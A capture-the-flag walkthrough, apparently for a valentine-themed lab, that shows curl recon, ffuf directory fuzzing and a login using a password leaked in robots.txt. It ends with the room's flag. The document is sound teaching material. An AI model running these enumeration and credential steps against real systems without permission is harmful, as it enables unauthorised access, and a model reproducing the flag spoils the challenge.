# Love Letters Anonymous — Full Walkthrough

## 1. Recon

Browsing the root page shows a simple valentine-themed site, "Love Letters Anonymous":

```bash
curl -s http://10.48.136.46:5000/
```

```html
<h1>Love Letters Anonymous</h1>
<p>Welcome to our secret valentine message board!</p>
<p>Share your anonymous love letters with the world...</p>
```

The header confirms a Flask app:

```
Server: Werkzeug/3.1.5 Python/3.10.12
```

The landing page has **no links and no forms** — a dead end at first glance.

### 1.1 Probe common endpoints

Guessing typical routes (`/login`, `/admin`, `/messages`, `/api`, `/flag`, ...) all return **404**, except one:

```bash
curl -s -o /dev/null -w "%{http_code}\n" http://10.48.136.46:5000/robots.txt
# 200
```

---

## 2. The vulnerability — `robots.txt` disclosure

`robots.txt` is meant to guide search-engine crawlers, **not** to hide anything. Here it leaks both a secret directory *and* a credential:

```bash
curl -s http://10.48.136.46:5000/robots.txt
```

```
User-agent: *
Disallow: /cupids_secret_vault/*

# cupid_arrow_2026!!!
```

Two findings:

- **`Disallow: /cupids_secret_vault/*`** — a hidden path the developer is trying to keep out of search results (but just advertised to attackers).
- **`# cupid_arrow_2026!!!`** — a suspicious comment that looks like a password.

> `robots.txt` is publicly readable by anyone. A `Disallow` entry is **not** access control — it's a signpost pointing straight at what you're trying to hide.

---

## 3. Exploring the hidden vault

Visit the disclosed directory (note the trailing slash — without it Flask issues a 308 redirect):

```bash
curl -s http://10.48.136.46:5000/cupids_secret_vault/
```

```html
<h1>Cupid's Secret Vault</h1>
<p>You've found the secret vault, but there's more to discover...</p>
```

The "more to discover" hint means we should keep enumerating **inside** the vault.

### 3.1 Content discovery under the vault

```bash
ffuf -u http://10.48.136.46:5000/cupids_secret_vault/FUZZ \
     -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt \
     -mc 200,301,302,307,308,401,403
```

Result:

```
administrator           [Status: 200]
```

---

## 4. The hidden admin panel

```bash
curl -s http://10.48.136.46:5000/cupids_secret_vault/administrator
```

It's an admin login form ("Cupid's Vault") with `username` and `password` fields posting to itself:

```html
<h1>Cupid's Vault</h1>
<form method="POST">
    <input type="text" name="username" required>
    <input type="password" name="password" required>
</form>
```

---

## 5. Logging in with the leaked credential

The password was handed to us in the `robots.txt` comment. Pairing it with the obvious `admin` username:

```bash
curl -s -X POST \
     -d "username=admin&password=cupid_arrow_2026!!!" \
     http://10.48.136.46:5000/cupids_secret_vault/administrator
```

Login succeeds and the Admin Dashboard renders the flag:

```html
<h1>Welcome, Cupid!</h1>
<p>Congratulations! You've discovered Cupid's secret vault and found the hidden treasure of love!</p>
<div class="flag-box">
    THM{l0v3_is_in_th3_r0b0ts_txt}
</div>
```

### 🚩 Flag

```
THM{l0v3_is_in_th3_r0b0ts_txt}
```